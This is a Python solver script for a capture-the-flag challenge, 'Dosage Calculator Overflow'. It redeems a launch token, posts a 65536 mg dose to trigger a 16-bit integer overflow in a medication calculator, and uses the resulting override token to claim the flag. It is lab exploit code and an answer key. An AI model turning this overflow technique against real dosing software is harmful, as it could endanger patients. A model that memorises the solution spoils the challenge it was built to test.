#!/usr/bin/env python3
"""Recover the flag from a fresh Dosage Calculator Overflow runtime URL.

The launch URL is intentionally supplied at run time because its token is
short-lived and must never be saved in this repository. The recovered flag is
printed only to stdout.
"""

from __future__ import annotations

import argparse
import json
import os
import re
import sys
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qs, urlencode, urlparse
from urllib.request import Request, urlopen


RUNTIME_ORIGIN = "https://hackforachangeruntime.vercel.app"
REDEEM_URL = "https://vgwukffsjudbybdeuodn.supabase.co/functions/v1/redeem-challenge-token"
CLAIM_URL = "https://vgwukffsjudbybdeuodn.supabase.co/functions/v1/claim-runtime-flag"
SLUG = "dosage-calculator-overflow"
FLAG_RE = re.compile(r"SDG\{[^\r\n}]+\}")


def post_json(url: str, payload: dict[str, Any], timeout: float, token: str | None = None) -> dict[str, Any]:
    """POST JSON without cookies and return a JSON object."""
    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
    }
    if token:
        headers["Authorization"] = f"Bearer {token}"
    request = Request(
        url,
        data=json.dumps(payload, separators=(",", ":")).encode("utf-8"),
        headers=headers,
        method="POST",
    )
    try:
        with urlopen(request, timeout=timeout) as response:
            data = json.loads(response.read().decode("utf-8"))
    except HTTPError as exc:
        raise RuntimeError(f"request failed with HTTP {exc.code}") from exc
    except URLError as exc:
        raise RuntimeError("network request failed") from exc
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise RuntimeError("endpoint returned invalid JSON") from exc
    if not isinstance(data, dict):
        raise RuntimeError("endpoint returned an unexpected JSON value")
    return data


def extract_launch_token(launch_url: str) -> str:
    parsed = urlparse(launch_url)
    if parsed.scheme != "https" or parsed.netloc != "hackforachangeruntime.vercel.app":
        raise ValueError("launch URL must use the authorized runtime host")
    if parsed.path.rstrip("/") != f"/r/{SLUG}":
        raise ValueError("launch URL is for a different challenge")
    token = parse_qs(parsed.query).get("token", [""])[0]
    if not token:
        raise ValueError("launch URL has no token")
    return token


def solve(launch_url: str, timeout: float) -> str:
    """Redeem a fresh token, trigger a 16-bit overflow, and claim the flag."""
    launch_token = extract_launch_token(launch_url)
    runtime_state = post_json(REDEEM_URL, {"token": launch_token}, timeout, launch_token)
    seed = runtime_state.get("artifact_seed")
    if not isinstance(seed, str) or not seed:
        raise RuntimeError("token redemption returned no artifact seed")

    endpoint = f"{RUNTIME_ORIGIN}/api/{SLUG}?{urlencode({'seed': seed})}"
    calculation = post_json(
        endpoint,
        {"medication": "Amoxicillin", "dose_mg": 65536, "frequency_per_day": 1},
        timeout,
    )
    proof = calculation.get("override_token")
    if not isinstance(proof, str) or not proof:
        raise RuntimeError("16-bit overflow did not yield an override proof")

    claim = post_json(
        CLAIM_URL,
        {"token": launch_token, "proof": proof, "slug": SLUG},
        timeout,
        launch_token,
    )
    flag = claim.get("flag")
    if not isinstance(flag, str) or not FLAG_RE.fullmatch(flag):
        raise RuntimeError("claim did not return a valid flag")
    return flag


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--launch-url",
        default=os.environ.get("HFC_LAUNCH_URL"),
        help="fresh /r/dosage-calculator-overflow?token=... URL (or HFC_LAUNCH_URL)",
    )
    parser.add_argument("--timeout", type=float, default=15.0)
    args = parser.parse_args()
    if not args.launch_url:
        parser.error("--launch-url or HFC_LAUNCH_URL is required")
    try:
        print(solve(args.launch_url, args.timeout))
    except (RuntimeError, ValueError) as exc:
        print(f"error: {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
